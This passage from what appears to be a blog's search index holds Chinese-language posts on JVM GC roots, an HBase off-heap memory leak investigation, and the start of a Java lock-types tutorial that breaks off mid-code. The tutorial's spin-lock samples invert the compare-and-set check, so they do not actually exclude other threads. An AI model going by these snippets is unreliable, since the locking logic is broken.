            <tag> 开发工具 </tag>
            
            <tag> java虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GC ROOTS的真实含义</title>
      <link href="/2019/01/14/java/java-xu-ni-ji/gc-root-de-zhen-shi-han-yi/"/>
      <url>/2019/01/14/java/java-xu-ni-ji/gc-root-de-zhen-shi-han-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="GC-ROOTS的真实含义"><a href="#GC-ROOTS的真实含义" class="headerlink" title="GC ROOTS的真实含义"></a>GC ROOTS的真实含义</h1><p>之前看深入理解JVM这本书，对里面的GC ROOTS的真实含义不是太清楚，网上查了一大堆资料都没有说的很清楚，下面这是从知乎大神上看到的，这里面记录一下，和大家一起学习。</p><h2 id="含义说明"><a href="#含义说明" class="headerlink" title="含义说明"></a>含义说明</h2><p>所谓“GC Roots”，或者说tracing GC的“根集合”，就是一组<strong>必须活跃的引用</strong>。</p><p>例如说，这些引用可能包括：</p><ol><li>所有Java线程当前活跃的栈帧里指向GC堆里的对象的引用；换句话说，当前所有正在被调用的方法的引用类型的参数/局部变量/临时值。</li><li>VM的一些静态数据结构里指向GC堆里的对象的引用，例如说HotSpot VM里的Universe里有很多这样的引用。</li><li>JNI handles，包括global handles和local handles</li></ol><ul><li>（看情况）所有当前被加载的Java类</li><li>（看情况）Java类的引用类型静态变量</li><li>（看情况）Java类的运行时常量池里的引用类型常量（String或Class类型）</li><li>（看情况）String常量池（StringTable）里的引用</li></ul><p>注意，是一组必须活跃的<strong>引用</strong>，不是<strong>对象</strong>。</p><p>Tracing GC的根本思路就是：给定一个集合的引用作为根出发，通过引用关系遍历对象图，能被遍历到的（可到达的）对象就被判定为存活，其余对象（也就是没有被遍历到的）就自然被判定为死亡。<strong>注意再注意</strong>：tracing GC的本质是通过找出所有活对象来把其余空间认定为“无用”，而不是找出所有死掉的对象并回收它们占用的空间。</p><p>GC roots这组引用是tracing GC的起点。要实现语义正确的tracing GC，就必须要能完整枚举出所有的GC roots</p><p>，否则就可能会漏扫描应该存活的对象，导致GC错误回收了这些被漏扫的活对象。</p><p>这就像任何递归定义的关系一样，如果只定义了递推项而不定义初始项的话，关系就无法成立——无从开始；而如果初始项定义漏了内容的话，递推出去也会漏内容。</p><h2 id="发散问题"><a href="#发散问题" class="headerlink" title="发散问题"></a>发散问题</h2><p>那么分代式GC对GC roots的定义有什么影响呢？</p><p>答案是：分代式GC是一种部分收集（partial collection）的做法。在执行部分收集时，从GC堆的非收集部分指向收集部分的引用，也必须作为GC roots的一部分。</p><p>具体到分两代的分代式GC来说，如果第0代叫做young gen，第1代叫做old gen，那么如果有minor GC / young GC只收集young gen里的垃圾，则young gen属于“收集部分”，而old gen属于“非收集部分”，那么从old gen指向young gen的引用就必须作为minor GC / young GC的GC roots的一部分。</p><p>继续具体到HotSpot VM里的分两代式GC来说，除了old gen到young gen的引用之外，有些带有弱引用语义的结构，例如说记录所有当前被加载的类的SystemDictionary、记录字符串常量引用的StringTable等，在young GC时必须要作为strong GC roots，而在收集整堆的full GC时则不会被看作strong GC roots。</p><p>换句话说，young GC比full GC的GC roots还要更大一些。如果不能理解这个道理，那整个讨论也就无从谈起了。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hbase堆外内存溢出底层定位</title>
      <link href="/2019/01/10/hbase/hbase-dui-wai-nei-cun-yi-chu-di-ceng-ding-wei/"/>
      <url>/2019/01/10/hbase/hbase-dui-wai-nei-cun-yi-chu-di-ceng-ding-wei/</url>
      
        <content type="html"><![CDATA[<h1 id="hbase堆外内存溢出底层定位"><a href="#hbase堆外内存溢出底层定位" class="headerlink" title="hbase堆外内存溢出底层定位"></a>hbase堆外内存溢出底层定位</h1><blockquote><p>下文所说的 hbase client 版本，如无特指，则皆为 1.2.3。</p></blockquote><p>之前项目中出现堆外内存溢出（<a href="https://blog.csdn.net/u012099869/article/details/82757999" target="_blank" rel="noopener">排查过程</a>），虽然已经解决了问题，但当时没有深究底层的原理，最近抽空从底层入手，深入研究了 hbase client 读写源码，配合 jmeter 压测特定接口，并使用 mat 等工具分析，最终定位到了 hbase 堆外内存溢出的根本原因，本次就梳理下完整的过程，以及涉及的一些原理，防止以后踩坑。</p><h1 id="一-溢出现象"><a href="#一-溢出现象" class="headerlink" title="一.溢出现象"></a>一.溢出现象</h1><p>单台服务器刚发布时 java 进程占用3g，以一天5%左右的速度增长，一定时间过后进程占用接近90%，触发服务器报警，而此时 old 区占用在 50%，未触发 CMS GC，而导致堆外内存溢出。</p><p>异常堆栈：</p><p><img src="https://img-blog.csdnimg.cn/20190109093506363.png" alt="img"></p><p>top 命令查看进程占用：</p><p><img src="https://img-blog.csdn.net/20180918144334159" alt="img"></p><p>机器为 8核16G，JVM配置如下:</p><pre class=" language-shell"><code class="language-shell">-Xms8g -Xmx8g -Xmn3g -Xss512k -XX:MetaspaceSize=256m -XX:MaxMetaspaceSize=512m -XX:+UseConcMarkSweepGC -XX:+DisableExplicitGC -XX:-UseGCOverheadLimit-XX:+UseCMSInitiatingOccupancyOnly -XX:CMSInitiatingOccupancyFraction=70-XX:+CMSParallelRemarkEnabled -XX:+UseFastAccessorMethods 12345678910</code></pre><h1 id="二-排查过程-amp-原理分析"><a href="#二-排查过程-amp-原理分析" class="headerlink" title="二.排查过程&amp;原理分析"></a>二.排查过程&amp;原理分析</h1><h2 id="1-初步分析"><a href="#1-初步分析" class="headerlink" title="1.初步分析"></a>1.初步分析</h2><p>根据异常堆栈，可以看出是 hbase.write() 分配直接内存导致的堆外内存溢出。而直接内存分配空间不足时，会调用 System.gc()，由于 JVM 参数配置了 -XX:+DisableExplicitGC 禁用了 System.gc()，且 old 区占用才50%，未达到 CMS GC 阈值，因此抛出堆外内存溢出。</p><p><img src="https://img-blog.csdnimg.cn/20190109094033857.png" alt="img"></p><p>粗略的堆外内存计算方式：JVM 未设置直接内存大小参数 -XX:MaxDirectMemorySize, 则 CMS GC堆外内存为：old 区 - 1个survivor 区， 即 8G - 314M = 7.8G。</p><h2 id="2-压测主要接口"><a href="#2-压测主要接口" class="headerlink" title="2.压测主要接口"></a>2.压测主要接口</h2><p>因为不能用线上机器做实验，且不能确定是否有其他因素导致溢出。于是在性能环境使用 jmeter 压测应用主要接口，并观察堆外内存占用。</p><p>压测后发现堆外内存占用平稳，未出现溢出现象。</p><h2 id="3-释放-hbase-client-资源"><a href="#3-释放-hbase-client-资源" class="headerlink" title="3.释放 hbase client 资源"></a>3.释放 hbase client 资源</h2><p>此时将目光放到异常堆栈上，并查看系统封装的 hbase client ，发现使用完 HTable 后未调用 close() 释放资源，于是加上 close() 代码，并上线观察。但仍然出现溢出现象。</p><p><img src="https://img-blog.csdn.net/20180928192051831" alt="img"></p><h2 id="4-压测特定功能"><a href="#4-压测特定功能" class="headerlink" title="4.压测特定功能"></a>4.压测特定功能</h2><p>虽然不是hbase client使用的问题，但还是有相同的堆栈，说明 hbase 肯定有问题。</p><p>查找资料，发现 hbase 官方的 issue 列表里有一个堆外内存溢出的 case (<a href="https://issues.apache.org/jira/browse/HBASE-19320" target="_blank" rel="noopener">hbase direct memory leak issue</a>)。发现如果使用 jdk 的 HeapByteBuffer，在网络IO时，由于用户空间不能直接访问内核空间，因此会复制一个临时的 DirectByteBuffer 对象进行IO，且用 ThreadLocal 缓存该对象。如果使用多线程进行大数据量的网络IO，则可能导致内存溢出。</p><p><img src="https://img-blog.csdnimg.cn/2019010909513671.png" alt="img"></p><p>于是查看 hbase 源码，发现确实使用的是 HeapByteBuffer，使用 jVisualVM 查看 dump 文件中 java.nio.DirectByteBuffer 类的 GC Roots，发现是 HConnection 线程对象，而该对象在项目初始化时创建，并一直存活：</p><p><img src="https://img-blog.csdnimg.cn/20190109095441852.png" alt="img"></p><p>于是单独压测这两个接口，一次性读写10M左右的数据，并使用 gperftools 观察堆外内存占用。运行半小时出现溢出现象，观察 gperftools 文件，使用 malloc 分配堆外内存达到了 7900M:</p><p><img src="https://img-blog.csdnimg.cn/2019010909564313.png" alt="img"></p><p>至此复现了堆外内存溢出的现象，确实是 hbase 读写导致的。</p><h2 id="5-升级-hbase-client-至-2-1-0"><a href="#5-升级-hbase-client-至-2-1-0" class="headerlink" title="5.升级 hbase client 至 2.1.0"></a>5.升级 hbase client 至 2.1.0</h2><p>找到了泄露的点，那么解决方案就出来了：<br>不使用 HeapByteBuffer 或复用 DirectByteBuffer : 升级 base client 至 2.x，默认使用 netty<br>限制 jdk 缓存的堆外内存大小：jdk 升级至 jdk 9</p><p>考虑改动成本，将 hbase client 版本升级至 2.1.0，线上运行一段时间，系统稳定，无溢出现象。</p><h2 id="6-主要是哪里申请的堆外内存呢？"><a href="#6-主要是哪里申请的堆外内存呢？" class="headerlink" title="6.主要是哪里申请的堆外内存呢？"></a>6.主要是哪里申请的堆外内存呢？</h2><p>虽然已经解决了这个问题，但还有几个疑问：<br>压测脚本是使用 hbase 同时读写，那么到底是读，还是写造成的泄露？还是两者都有泄露？<br>hbase 读、写的溢出对应的是源码底层的哪一段，或是哪几段逻辑呢？<br>带着这些疑问，查看了一下 hbase client 读写的源码。</p><h3 id="1-hbase-写的源码"><a href="#1-hbase-写的源码" class="headerlink" title="1) hbase 写的源码"></a>1) hbase 写的源码</h3><p>主要分为获取 HTable、mutate、flushCommits 三个部分:</p><p><img src="https://img-blog.csdnimg.cn/20190109110555288.png" alt="img"></p><p>获取 HTable 会创建一个默认线程数256的线程池，并且创建一个新的 HTable 对象：</p><p><img src="https://img-blog.csdnimg.cn/20190109110642705.png" alt="img"></p><p>mutate 操作会将待写入的数据放到一个本地的 writeAsyncBuffer 缓存起来：</p><p><img src="https://img-blog.csdnimg.cn/2019010911080937.png" alt="img"></p><p>flushCommits 操作将 writeAsyncBuffer 中的数据写入到 hbase。这个过程中，hbase 把写入任务 SingleServerRequestRunnable 线程提交给线程池完成，调用方 wait 结果：</p><p><img src="https://img-blog.csdnimg.cn/2019010911085629.png" alt="img"></p><p>在 SingleServerRequestRunnable 线程中，调用 MultiServerCallable#call 方法，默认的 rpc 实现类为 RpcClientImpl( tracedWriteRequest 中会调用 setupIOstreams 方法建立连接)，数据通过 HeapByteBuffer，经由 nio 的 SocketChannelImpl 写入，并循环调用 IOUtil.write() 方法，分配临时的堆外内存，造成泄露，整体流程为：</p><p>由于传入的 totalSize 为写入数据的大小(10M)，因此 IOUtil.write() 申请的 DirectByteBuffer 大小为传入的大小（此处 HeapByteBuffer 的 limit 为 10338890，10M左右）:</p><p><img src="https://img-blog.csdnimg.cn/20190109111552960.png" alt="IOUtil.write()"></p><p>这里的线程池为前面获取 HTable 创建的，核心线程数默认256，那么最大占用堆外内存=256*10=2560M，未达到溢出的量。是不是还有其他地方在分配堆外内存呢？</p><h3 id="2-hbase-读的源码"><a href="#2-hbase-读的源码" class="headerlink" title="2) hbase 读的源码"></a>2) hbase 读的源码</h3><p>HTable.get() 通过匿名内部类的方式实现了 RetryingCallable<br>#call() 接口，在 RpcClientImpl#call 方法内被调用，向 hbase 发送读请求之前初始化 socket 连接，并启动 RpcClientImpl.Connection 线程，接收数据。其中发起请求流程和 hbase 写的流程一样:</p><p><img src="https://img-blog.csdnimg.cn/20190109111648780.png" alt="hbase.get()"></p><p>断点查看 IOUtil.read() 一次读取的字节数为 8192:</p><p><img src="https://img-blog.csdnimg.cn/20190109111740699.png" alt="IOUtil.read()"></p><p>查看 BufferedInputStream 类默认一次读取的字节数为 8192：</p><p><img src="https://img-blog.csdnimg.cn/20190109111840841.png" alt="BufferedInputStream"></p><p>因此虽然调用了 IOUtil.read() 也不会占用太大的堆外内存，而且由于 RpcClientImpl.Connection 线程接收完数据就消亡了，持有的堆外内存也会被 gc 回收。因此 hbase 读不会造成堆外内存泄露。</p><h2 id="7-分析性能环境-dump-文件"><a href="#7-分析性能环境-dump-文件" class="headerlink" title="7.分析性能环境 dump 文件"></a>7.分析性能环境 dump 文件</h2><p>到这里，可以确定 hbase 写会造成泄露，但目前造成泄露的内存量远大于前面分析的值。查看性能环境的 dump 文件，使用 OQL 语句查看 java.nio.DirectByteBuffer 的数量和大小，发现占据 10M 空间的对象数量有 788个，总内存大约为=10338894*788=7800M：</p><p><img src="https://img-blog.csdnimg.cn/20190109111927180.png" alt="OQL"></p><p>查看 java.nio.DirectByteBuffer 对象的 GC Roots，发现大量对象只有 cleaner 引用:</p><p><img src="https://img-blog.csdnimg.cn/20190109112036591.png" alt="Cleaner"></p><p>Cleaner 为 PhantomReference 的子类，在创建 DirectByteBuffer 对象时被创建。虚引用的作用在于跟踪垃圾回收过程，如果 GC 时发现一个对象的 GC Roots 只有虚引用，那么会将这个虚引用加入引用队列(ReferenceQueue)，系统有个后台线程 Reference.ReferenceHandler 会从这个队列获取 Cleaner 对象，调用它的 clean 方法，释放资源：</p><p><img src="https://img-blog.csdnimg.cn/20190109112116732.png" alt="clean()"></p><p>现在有大量的不可达对象，说明持有堆外内存的线程对象消亡了，但资源未被回收。jstat 查看 GC 情况，发现未进行 FGC，说明这些对象都进入了 old 区，而导致大量的堆外内存不能被释放，造成溢出。</p><p>而根据前面的分析，会持有堆外内存对象引用的只有 hconnection 线程池中的线程。于是仔细的再梳理一遍 hbase 写的链路，发现处理网络 IO 任务的线程池，创建的时候设置了allowCoreThreadTimeOut 为 true，允许核心线程消亡，keepAliveTime 为60s:</p><p><img src="https://img-blog.csdnimg.cn/20190109112155195.png" alt="img"></p><p>继续用 jmeter 压测 hbase 写接口，并使用 jstack 观察 hconnection 线程的情况，发现以1s一个线程的速度进行写入时，hconnection 线程数保持在60左右，只有一个线程是活跃的，其他线程都是等待状态(waiting)，且线程 count 数一直累加，说明进程一直在创建新线程并且一直有线程在消亡：</p><p><img src="https://img-blog.csdnimg.cn/20190109112253131.png" alt="threads&#39; state"></p><p>再查看线程池 ThreadPoolExecutor 源码，当线程池内活跃线程数少于核心线程数时，有新请求进来，会直接创建一个新的线程处理：</p><p><img src="https://img-blog.csdnimg.cn/20190109112342953.png" alt="core thread"></p><p>到这里基本定位到了泄露的原因了。</p><h2 id="8-总结"><a href="#8-总结" class="headerlink" title="8.总结"></a>8.总结</h2><p>导致 hbase 堆外内存溢出的主要是下面几个条件<strong>共同作用</strong>的结果：</p><ol><li><strong>默认的 RpcClientImpl</strong> 中使用了 <strong>HeapByteBuffer</strong>: 网络IO时数据会复制到堆外内存</li><li><strong>sun.nio.ch.Util</strong> 类会缓存堆外内存大小，且使用 <strong>ThreadLocal</strong> 方式: 引用由线程持有</li><li>异步写的线程池设置 <strong>allowCoreThreadTimeOut</strong> 为 true: 导致线程频繁消亡</li><li>写入的频率</li><li>JVM 未进行 FGC: 已进入 old 区的不可达的线程对象，持有的堆外内存资源无法被回收</li></ol><p>关于第四点，单独压测写入接口时，未限制频率，导致堆外内存到 3.5g 左右时，系统就直接进行 FGC 了，由于回收了堆外内存资源，因此未出现堆外内存溢出现象。</p><p><strong>完整导致流程描述</strong>：hbase 创建的线程池内的线程使用 HeapByteBuffer 存储数据，网络IO前会将数据复制到堆外内存对象 DirectByteBuffer 中；而 jdk 会以 ThreadLocal 的方式缓存该 DirectByteBuffer 对象申请的堆外内存，如果线程不消亡则不释放该内存；同时该线程池允许核心线程消亡，当业务方以一定的频率调用 hbase 写接口时，导致有些线程对象消亡并进入 Old 区；由于未进行 FGC，这些线程对象无法被回收，占用的堆外内存资源也无法被 GC 回收。一段时间后，造成堆外内存溢出。</p><p>对象进入 Old 区有很多可能，比如：</p><ul><li>Eden 区空间不足</li><li>长期存活对象进入 Old 区(线上查看存活年龄配置: jinfo -flag MaxTenuringThreshold = 6)</li></ul><p>梳理到这里，那么<strong>解决方案</strong>就多了几种，比如：</p><ol><li>配置 RpcClient 实现为 AsyncRpcClient (使用 netty 方式，性能环境已验证)</li><li>使用 Connection#getTable(tableName, pool) 传入自定义的线程池，设置allowCoreThreadTimeOut 为false，并限制每次写入的大小 (已验证)</li><li>提高核心线程消亡时间</li><li>控制 hbase 写入的频率</li><li>调低FGC 的阈值</li><li>调大JVM年龄计数器</li></ol><p>以上就是完整的流程了，如有疑问可与我交流。</p><h1 id="三-工具简介"><a href="#三-工具简介" class="headerlink" title="三.工具简介"></a>三.工具简介</h1><p>前面排查堆外内存溢出的过程中，使用了很多工具，主要有：</p><ul><li>jdk 命令行工具: jps, jstat, jmap</li><li>jdk 提供的内存监控工具: jConsole, jVisualVM</li><li>eclipse 提供的内存分析工具: mat</li><li>google 的监控堆外内存工具: gperftools</li><li>性能压测工具: jmeter</li><li>查看进程内存: smaps, pmap, gdb</li><li>sun 推出的针对 java 的动态追踪工具: btrace</li></ul><p>具体的工具用法就不介绍了，可自行搜索资料。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="http://product.dangdang.com/23259731.html#ddclick_search_searchinput" target="_blank" rel="noopener">《深入理解Java虚拟机》</a><br><a href="http://lovestblog.cn/blog/2015/05/12/direct-buffer/" target="_blank" rel="noopener">堆外内存完全解读</a><br><a href="https://issues.apache.org/jira/browse/HBASE-19320" target="_blank" rel="noopener">hbase direct memory leak issue</a><br><a href="http://www.evanjones.ca/java-bytebuffer-leak.html" target="_blank" rel="noopener">java byte buffer leak</a><br><a href="https://www.oracle.com/technetwork/java/javase/8u102-relnotes-3021767.html?printOnly=1" target="_blank" rel="noopener">jdk 8u102 update release notes: add MaxCachedBufferSize</a><br><a href="https://blog.csdn.net/u012099869/article/details/82757999#t13" target="_blank" rel="noopener">记一次堆外内存排查过程</a><br><a href="https://blog.csdn.net/u012099869/article/details/82870082#t15" target="_blank" rel="noopener">内存溢出分析之垃圾回收知识</a><br><a href="https://blog.csdn.net/u012099869/article/details/82870050#t1" target="_blank" rel="noopener">内存溢出分析之工具篇</a><br><a href="https://www.infoq.cn/article/get-to-know-rpc" target="_blank" rel="noopener">体系化认识RPC</a><br><a href="https://www.52im.net/thread-1935-1-1.html" target="_blank" rel="noopener">IO模型</a><br><a href="https://www.52im.net/thread-1939-1-1.html" target="_blank" rel="noopener">线程模型</a></p><p>转载自：<a href="https://blog.csdn.net/u012099869/article/details/86133144" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> Hbase </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hbase </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 中15种锁的介绍：公平锁，可重入锁，独享锁，互斥锁，乐观锁，分段锁，自旋锁等等</title>
      <link href="/2019/01/09/java/java-bing-fa/java-zhong-15-chong-suo-de-jie-shao-gong-ping-suo-ke-chong-ru-suo-du-xiang-suo-hu-chi-suo-le-guan-suo-fen-duan-suo-zi-xuan-suo-deng-deng/"/>
      <url>/2019/01/09/java/java-bing-fa/java-zhong-15-chong-suo-de-jie-shao-gong-ping-suo-ke-chong-ru-suo-du-xiang-suo-hu-chi-suo-le-guan-suo-fen-duan-suo-zi-xuan-suo-deng-deng/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-中15种锁的介绍：公平锁，可重入锁，独享锁，互斥锁，乐观锁，分段锁，自旋锁等等"><a href="#Java-中15种锁的介绍：公平锁，可重入锁，独享锁，互斥锁，乐观锁，分段锁，自旋锁等等" class="headerlink" title="Java 中15种锁的介绍：公平锁，可重入锁，独享锁，互斥锁，乐观锁，分段锁，自旋锁等等"></a>Java 中15种锁的介绍：公平锁，可重入锁，独享锁，互斥锁，乐观锁，分段锁，自旋锁等等</h1><h2 id="Java-中15种锁的介绍"><a href="#Java-中15种锁的介绍" class="headerlink" title="Java 中15种锁的介绍"></a>Java 中15种锁的介绍</h2><p>在读很多并发文章中，会提及各种各样锁如公平锁，乐观锁等等，这篇文章介绍各种锁的分类。介绍的内容如下：</p><ul><li>公平锁 / 非公平锁</li><li>可重入锁 / 不可重入锁</li><li>独享锁 / 共享锁</li><li>互斥锁 / 读写锁</li><li>乐观锁 / 悲观锁</li><li>分段锁</li><li>偏向锁 / 轻量级锁 / 重量级锁</li><li>自旋锁</li></ul><p>上面是很多锁的名词，这些分类并不是全是指锁的状态，有的指锁的特性，有的指锁的设计，下面总结的内容是对每个锁的名词进行一定的解释。</p><h2 id="公平锁-非公平锁"><a href="#公平锁-非公平锁" class="headerlink" title="公平锁 / 非公平锁"></a>公平锁 / 非公平锁</h2><p><strong>公平锁</strong></p><ul><li>公平锁是指多个线程按照申请锁的顺序来获取锁。</li></ul><p><strong>非公平锁</strong></p><ul><li>非公平锁是指多个线程获取锁的顺序并不是按照申请锁的顺序，有可能后申请的线程比先申请的线程优先获取锁。有可能，会造成优先级反转或者饥饿现象。</li></ul><p>对于<code>Java ReentrantLock</code>而言，通过构造函数指定该锁是否是公平锁，默认是非公平锁。非公平锁的优点在于吞吐量比公平锁大。<br>对于<code>Synchronized</code>而言，也是一种非公平锁。由于其并不像<code>ReentrantLock</code>是通过<code>AQS</code>的来实现线程调度，所以并没有任何办法使其变成公平锁。</p><h2 id="可重入锁-不可重入锁"><a href="#可重入锁-不可重入锁" class="headerlink" title="可重入锁 / 不可重入锁"></a>可重入锁 / 不可重入锁</h2><p><strong>可重入锁</strong></p><p>广义上的可重入锁指的是可重复可递归调用的锁，在外层使用锁之后，在内层仍然可以使用，并且不发生死锁（前提得是同一个对象或者class），这样的锁就叫做可重入锁。<code>ReentrantLock</code>和<code>synchronized</code>都是可重入锁</p><pre class=" language-java"><code class="language-java"><span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">setA</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>    Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">setB</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>    Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>上面的代码就是一个可重入锁的一个特点，如果不是可重入锁的话，setB可能不会被当前线程执行，可能造成死锁。</p><p><strong>不可重入锁</strong></p><p>不可重入锁，与可重入锁相反，不可递归调用，递归调用就发生死锁。看到一个经典的讲解，使用自旋锁来模拟一个不可重入锁，代码如下</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span>AtomicReference<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UnreentrantLock</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> AtomicReference<span class="token operator">&lt;</span>Thread<span class="token operator">></span> owner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicReference</span><span class="token operator">&lt;</span>Thread<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Thread current <span class="token operator">=</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//这句是很经典的“自旋”语法，AtomicInteger中也有</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>owner<span class="token punctuation">.</span><span class="token function">compareAndSet</span><span class="token punctuation">(</span>null<span class="token punctuation">,</span> current<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Thread current <span class="token operator">=</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        owner<span class="token punctuation">.</span><span class="token function">compareAndSet</span><span class="token punctuation">(</span>current<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>代码也比较简单，使用原子引用来存放线程，同一线程两次调用lock()方法，如果不执行unlock()释放锁的话，第二次调用自旋的时候就会产生死锁，这个锁就不是可重入的，而实际上同一个线程不必每次都去释放锁再来获取锁，这样的调度切换是很耗资源的。</p><p><strong>把它变成一个可重入锁</strong>：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span>AtomicReference<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UnreentrantLock</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> AtomicReference<span class="token operator">&lt;</span>Thread<span class="token operator">></span> owner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicReference</span><span class="token operator">&lt;</span>Thread<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> state <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Thread current <span class="token operator">=</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>current <span class="token operator">==</span> owner<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            state<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//这句是很经典的“自旋”式语法，AtomicInteger中也有</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>owner<span class="token punctuation">.</span><span class="token function">compareAndSet</span><span class="token punctuation">(</span>null<span class="token punctuation">,</span> current<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Thread current <span class="token operator">=</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>current <span class="token operator">==</span> owner<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>state <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                state<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                owner<span class="token punctuation">.</span><span class="token function">compareAndSet</span><span class="token punctuation">(</span>current<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>在执行每次操作之前，判断当前锁持有者是否是当前对象，采用state计数，不用每次去释放锁。</p><p><strong>ReentrantLock中可重入锁实现</strong></p><p>这里看非公平锁的锁获取方法：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">nonfairTryAcquire</span><span class="token punctuation">(</span><span class="token keyword">int</span> acquires<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">final</span> Thread current <span class="token operator">=</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">compareAndSetState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> acquires<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token 